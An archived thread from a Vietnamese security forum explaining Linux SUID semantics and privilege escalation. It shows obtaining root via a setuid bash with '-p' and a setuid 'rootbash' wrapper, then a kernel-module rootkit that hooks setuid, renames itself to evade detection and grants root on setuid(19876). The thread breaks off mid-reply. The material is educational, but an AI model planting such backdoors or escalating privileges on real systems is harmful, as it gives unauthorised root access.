<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="get root qua SUID, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>get root qua SUID - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="" title="[Logo]">
								<img src="/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.html">Forum Index </a> 
			<img src="/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập </a>
			<img src="/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/12296.html" name="top" id="top">get root qua SUID</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/12296.html"><img src="/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; get root qua SUID<a name="71561" id="71561"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">16/07/2007 18:22:14 (+0700) | <a href="/hvaonline/posts/list/12296.html#71561">#1</a> | 71561 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="/hvaonline/images/avatar/089f41810321eefc3f4eef5d4a388e42.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/67588.html"><b>conmale</b></a><br>
	<font color="#FF3333">Administrator</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 07/05/2004 23:43:15<br>
		Messages: 9353<br>
	
		Location: down under<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/67588.html" class="icon_profile"><img src="/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/67588.html" class="icon_pm"><img src="/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">Vì lý do bảo mật, bash shell kiểm tra và "drop" chủ quyền khi shell được tạo ra. Cho dù áp dụng s bit trên bash cũng không thể spawn một root shell với bash được.<br/> <br/> Để hiểu rõ cơ chế này, bồ phải nắm một số khái niệm căn bản. Một POSIX process được tạo ra có 3 user id khác nhau:<br/> - real user ID (ruid) --&gt; real user ID thường được ấn định từ login.<br/> - effective user ID (euid) --&gt; chủ quyền hiện tại để có thể thực hiện chuyện gì.<br/> - saved user ID (suid) --&gt; chủ quyền được root thiết lập khi gọi hàm setuid(). Khi một ứng trình được khởi động, effective user id (euid) hiện có được copy và lưu trữ thành saved user ID (suid).<br/> <br/> Trên Linux (các *nix khác như BSD và System V based có một số ứng dụng tương đồng và dị biệt. Ở đây chúng ta chỉ nói trong phạm vi Linux),<br/> <br/> - nếu euid của người gọi hàm này là root (hoặc privilege user), nói chung có ID là 0, thì cơ chế setuid (gọi hàm setuid()) được ứng hiệu (để ấn định ruid, euid và suid),<br/> <br/> - nếu euid của người gọi hàm này không phải là root (hoặc không phải là privilege user), nói chung là có ID không phải là 0 thì cơ chế setuid (gọi hàm setuid()) không được ứng hiệu. Tuy nhiên, khả năng thực thi cơ chế setuid này vẫn có thể được sử dụng bên ngoài giới hạn uid-setting system calls.<br/> <br/> Đối với bash, nó có cơ chế kiểm tra euid, ruid và suid. Ngay sau khi một process được tạo ra để mở ra một bash shell, nếu euid không phải là 0 thì process này có euid chính là ruid và đồng thời suid cũng có giá trị y như ruid. Một user có ID là 500 chẳng hạn, anh ta tạo một bash shell (bằng cách chạy /bin/bash chẳng hạn) thì euid cũng là 500.<br/> <br/> Ngay cả chương trình bash này đã set s bit (chmod u+s /usr/bin) thì bash vẫn drop chủ quyền của người dùng này về với id thật sự của anh ta.<br/> <br/> Ví dụ:<br/> [conmeo@home conmale]$ ls -la bash<br/> -rwsr-xr-x 1 root root 626028 Aug 7 21:06 bash<br/> <br/> [conmeo@home conmale]$ id<br/> uid=504(conmeo) gid=504(canivore) groups=504(canivore)<br/> <br/> Nếu chạy:<br/> ./bash<br/> <br/> Rồi thử:<br/> id thì sẽ thấy kết quả y hệt như trên:<br/> uid=504(conmeo) gid=504(canivore) groups=504(canivore)<br/> <br/> <br/> Tuy nhiên, bash có một ngoại lệ (đọc kỹ man page của bash thì mới thấy ngoại lệ này :<br/> If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it appears in the environment, is ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.<br/> <br/> Cho nên, thử:<br/> <br/> [conmeo@home conmale]$ ./bash -p<br/> <br/> rồi thử:<br/> bash-2.05b# id<br/> thì sẽ thấy:<br/> uid=504(conmeo) gid=504(canivore) euid=0(root) groups=504(canivore)<br/> <br/> Cho dù conmeo vẫn có ruid và suid là 504, hắn vẫn có euid là 0 --&gt; hắn đang đóng vai trò root<br/> <br/> Thử access một file nào đó do root làm chủ xem?<br/> <br/> Còn câu Tuy nhiên, khả năng thực thi cơ chế setuid này vẫn có thể được sử dụng bên ngoài giới hạn uid-setting system calls. thì sao?<br/> <br/> Hãy thử một chương trình c đơn giản gọi là rootbash chẳng hạn:<br/> <br/> CODE<br/> #include&lt;stdlib.h&gt;<br/> main () {<br/> setuid(0);<br/> system("/bin/bash");<br/> }<br/> <br/> <br/> Như bồ thấy, hàm setuid được gọi và ấn định giá trị là 0 (root) rồi mới spawn bash theo sau. Thử compile nó:<br/> <br/> # gcc rootbash.c -o rootbash<br/> <br/> sauo đó đổi mode cho nó:<br/> # chmod 4755 rootbash<br/> <br/> Thử chạy rootbash xem chuyện gì xảy ra?<br/> <br/> Vậy, vấn đề cốt lõi là ở đâu?<br/> <br/> 1. nếu chương trình không set suid (s bit), hàm setuid() không được dùng khi một process được tạo ra để chạy chương trình ấy<br/> <br/> 2. nếu người khởi tạo chương trình có real user id (ruid) không phải là 0 (root) thì setuid() không được dùng.<br/> <br/> 3. nếu người khởi tạo chương trình có real user id (ruid) là 0 (root) thì setuid() được dùng.<br/> <br/> 4. có những chương trình cho dù có s bit set nhưng vẫn "bị" drop privilege như bash chẳng hạn (đây là những chương trình được viết kỹ và quan tâm đến bảo mật rõ ràng).<br/> <br/> 5. nếu một chương trình không kiểm soát ruid, euid và suid một cách chặt chẽ và nếu nó được set s bit. Đây là cửa ngõ cho privilege escalation.<br/> <br/> <i><font color='orange'>(bài conmale post trên diễn đàn HVA trước đây - post lại vì có người thắc mắc về SUID).</font></i></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall">What bringing us together is stronger than what pulling us apart.</span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: get root qua SUID<a name="71562" id="71562"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">16/07/2007 18:24:35 (+0700) | <a href="/hvaonline/posts/list/12296.html#71562">#2</a> | 71562 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="/hvaonline/images/avatar/089f41810321eefc3f4eef5d4a388e42.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/67588.html"><b>conmale</b></a><br>
	<font color="#FF3333">Administrator</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 07/05/2004 23:43:15<br>
		Messages: 9353<br>
	
		Location: down under<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/67588.html" class="icon_profile"><img src="/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/67588.html" class="icon_pm"><img src="/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row2"><span class="postbody"><i><font color='orange'>(bài của prof tham gia - nếu tôi nhớ không lầm).</font></i><br/> <br/> Tớ xin nói thêm một chút về LKM. LKM thực chất là một object file chứa mã lệnh xử lý cho một mục đích nào đó được nạp vào kernel khi cần thiết. Nếu không có LKM, các sửa đổi áp đặt vào nhân Linux sẽ không thể tránh khỏi việc biên dịch và khởi động lại hệ thống. Ngoài ra, một lợi ích quan trọng của LKM là nó giúp cho kích thước nhân Linux không trở nên quá đồ sộ. Những module cần được sử dụng sẽ được nạp vào kernel bằng lệnh insmod, và khi không còn nhu cầu, module có thể được gỡ bỏ bằng lệnh rmmod. Hơn nữa, việc viết một LKM cũng sẽ đơn giản hơn nhiều so với việc viết thêm mã nguồn trực tiếp vào nhân Linux.<br/> <br/> Trở lại vấn đề viết một LKM để chặn lời gọi hàm hệ thống setuid(). Đầu tiên, mỗi LKM đều cần phải có 2 hàm cơ bản là init_module() và cleanup_module() tương ứng sẽ được gọi khi cài đặt và khi gỡ bỏ module.<br/> <br/> Sau đây là một ví dụ đơn giản, module logsetuid, về cách chặn lời gọi hàm setuid():<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#define __KERNEL__
#define MODULE
#include &lt;linux/config.h&gt;
#include &lt;linux/modules.h&gt;
#include &lt;linux/version.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/types.h&gt;

int &#40;*real_setuid&#41; &#40;uid_t&#41;;
int new_setuid &#40;uid_t&#41;;
extern void *sys_call_table&#91;&#93;;

int init_module&#40;&#41;
{
real_setuid = sys_call_table&#91; SYS_setuid &#93;;
sys_call_table&#91; SYS_setuid &#93; = &#40;void *&#41;new_setuid;
return 0;
}
int cleanup_module&#40;&#41;
{
sys_call_table&#91; SYS_setuid &#93; = &#40;void *&#41;real_setuid;
return 0;
}

int new_setuid&#40;uid_t uid&#41;
{
int status;
if &#40; !current-&gt;uid || uid == current-&gt;uid&#41; return &#40;*real_setuid&#41;&#40;uid&#41;;
printk&#40;“logsetuid: uid: %d euid:%d dest_uid:%d pid:%d proc:%d,
current-&gt;uid, current-&gt;euid, uid, current-&gt;pid, current-&gt;comm”&#41;;
printk&#40;“status:%s\n”, &#40;status = &#40;*real_setuid&#41; &#40;uid&#41;&#41; ? “failed” : “succeeded”&#41;;
return status;
}</pre>
		</div><br/> <br/> Module này thực hiện việc chặn lời gọi hàm setuid() và ghi lại chúng thông qua klogd daemon, rồi chuyển cho syslogd để xử lý.<br/> <br/> Việc biên dịch và cài đặt module tuy có yêu cầu một số tùy chọn khác so với việc biên dịch các chương trình phía user space thông thường nhưng nó cũng không quá phức tạp. Phần này tôi xin dành cho bạn đọc tìm hiểu thêm. Hiện nay, có rất nhiều tài liệu trên mạng đều dạy cách viết & cài đặt một LKM từ A-&gt;Z.<br/> <br/> Trở lại với ví dụ trên, sau khi hoàn thành việc cài đặt module trên, bạn có thể viết một chương trình test chỉ đơn giản gọi hàm setuid() rồi quan sát qua kernel log. Bạn nên thực thi chương trình test này với các vai trò người dùng khác nhau, và chú ý với tài khoản root. Lý do là lời gọi hàm setuid() của chương trình test sẽ chỉ được thực thi thành công với quyền root (vì euid = 0) và có bit suid được lập. Mỗi dòng trong kernel log chứa các giá trị uid, processID, process name, và kết quả của việc gọi hàm setuid.<br/> <br/> Dưới đây là một ví dụ về kernel log:<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>logsetuid: uid: 500 euid: 500 dest_uid: 0 pid: 13552
proc: setuid_test status: failed
logsetuid: uid: 500 euid: 500 dest_uid: 0 pid: 13624
proc: sh_copy status: failed
logsetuid: uid: 705 euid: 705 dest_uid: 0 pid: 13680
proc: setuid_test1 status: failed
logsetuid: uid: 500 euid: 0 dest_uid: 0 pid: 13802
proc: setuid_test2 status: succeeded</pre>
		</div><br/> <br/> <br/> Như vậy, với ví dụ này, ở đây chúng ta đã thực sự nắm lấy phần kiểm soát lời gọi hàm setuid() bằng đoạn mã xử lý trước của chúng ta. Trong trường hợp này, đoạn mã xử lý chỉ mang tính chất tham khảo – không gây hại. Tuy nhiên, cũng chính sức mạnh của kernel đã làm cho các loadable kernel module trở nên hữu dụng hơn đối với kẻ tấn công:<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int new_setuid&#40;uid_t&#41;;
int &#40;*real_setuid&#41;&#40;uid_t&#41;;
extern void *sys_call_table&#91;&#93;;

int init_module&#40;&#41;
{
// Đổi tên module để tránh bị phát hiện.
register struct module *mp asm&#40;“%ebx”&#41;;
*&#40;char *&#41; &#40;mp-&gt;name&#41; = ‘d’; *&#40;char *&#41; &#40;mp-&gt;name+1&#41; = ‘s’;
*&#40;char *&#41; &#40;mp-&gt;name+2&#41; = ‘2’; *&#40;char *&#41; &#40;mp-&gt;name+3&#41; = ‘\0’;
real_setuid = sys_call_table&#91; SYS_setuid &#93;;
sys_call_table&#91; SYS_setuid &#93; = &#40;void *&#41; new_setuid;
return 0;
}

int cleanup_module&#40;&#41;
{
sys_call_table&#91; SYS_setuid &#93; = &#40;void *&#41; real_setuid;
return 0;
}

int new_setuid&#40;uid_t uid&#41;
{
if &#40;uid == 19876&#41;
{
current-&gt;uid = 0; current-&gt;gid = 0;
current-&gt;euid = 0; current-&gt;egid = 0;
return 0;
}
return &#40;*real_setuid&#41;&#40;uid&#41;;
}</pre>
		</div><br/> <br/> Đoạn code trên cũng thực hiện chức năng tương tự. Tuy nhiên, thay vì ghi lại thông tin, hàm new_setuid() sẽ thực hiện việc kiểm tra user ID được yêu cầu và nếu nó là 19876 sẽ set user ID hiện tại là 0. Bất kỳ lúc nào một chương trình gọi hàm setuid(19876), nó sẽ thành công và tiến trình này sẽ chạy với quyền ưu tiên là root mà không quan tâm đến việc ai kích hoạt tiến trình này.<br/> <br/> Vì bất kỳ lời gọi hàm hệ thống nào cũng có thể bị chặn, nên hiển nhiên là những đoạn mã “độc hại” nếu được “import” vào kernel có thể gây hậu quả xấu đến vấn đề bảo mật. Ứng dụng truyền thống các đoạn mã kiểu kernel module này thường là để che dấu các hành vi của một hacker nào đó và cấp quyền truy cập root.<br/> <br/> Như chúng ta thấy trong đoạn code trước, module này có thể thay đổi tên của chính nó để xuất hiện với tư cách hoàn toàn vô hại (chẳng hạn, nếu ds là một module thông dụng, và như vậy ds2 có thể là một cái tên nghe cũng “dễ chịu” ). Ngoài ra, còn có các kỹ thuật ẩn tên module, tránh bị phát hiện trong module list. Phần này xin dành cho bạn đọc tìm hiểu thêm.</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall">What bringing us together is stronger than what pulling us apart.</span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: get root qua SUID<a name="144661" id="144661"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">02/08/2008 00:32:04 (+0700) | <a href="/hvaonline/posts/list/12296.html#144661">#3</a> | 144661 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="/hvaonline/images/avatar/b63fff5c48d90ccdf31ee9a2879d29e0.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/135861.html"><b>rickb</b></a><br>
	<font color="#ff3399">Reseacher</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 27/01/2007 17:47:27<br>
		Messages: 200<br>
	
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/135861.html" class="icon_profile"><img src="/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/135861.html" class="icon_pm"><img src="/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
			<a href="http://edit.yahoo.com/config/send_webmesg?.target=nghuuhoan&amp;.src=pg"><img src="/hvaonline/templates/viet/images/icon_yim.gif" alt="[Yahoo!]" title="[YIM]"></a>
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">hi anh conmale,<br/> <br/> Em muốn hỏi 1 tý, như anh nói bash shell có cơ chế xác định RUID, EUID và SUID nên dù nó có được bật SUID bit thì nó vẫn drop chủ quyền về với id thật sự của người chạy file bash này, nhưng em thắc mắc nếu là như vậy thì nó đã mất đi ý nghĩa của SUID (chmod u+s) rồi, vì ý nghĩa của việc bật SUID bit là mong muốn tất cả user đều có thể chạy file bash này với EUID là owner file đó (tức là root) mà ở đây SUID được bật mà lại xét EUID thì cũng nhưng bình thường (ko bật SUID) rồi ? Như vậy hóa ra file bash này có bật SUID bit hay ko bật thì cũng y chang như nhau à ?<br/> <br/> Thân,</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: get root qua SUID<a name="144799" id="144799"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">02/08/2008 23:06:59 (+0700) | <a href="/hvaonline/posts/list/12296.html#144799">#4</a> | 144799 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="/hvaonline/images/avatar/3f44f3018ff71ff4a7d22a98f3babb55.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/128502.html"><b>quanta</b></a><br>
	<font color="#FF9900">Moderator</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 28/07/2006 14:44:21<br>
		Messages: 7265<br>
	
		Location: $ locate `whoami`<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/128502.html" class="icon_profile"><img src="/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/128502.html" class="icon_pm"><img src="/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row2"><span class="postbody">Chào <b>rickb</b>,<br/> <br/> <p></p>
		<cite class="blockquote">rickb wrote:</cite><br>
		<blockquote>Như vậy hóa ra file bash này có bật SUID bit hay ko bật thì cũng y chang như nhau à ?<br/> &nbsp;
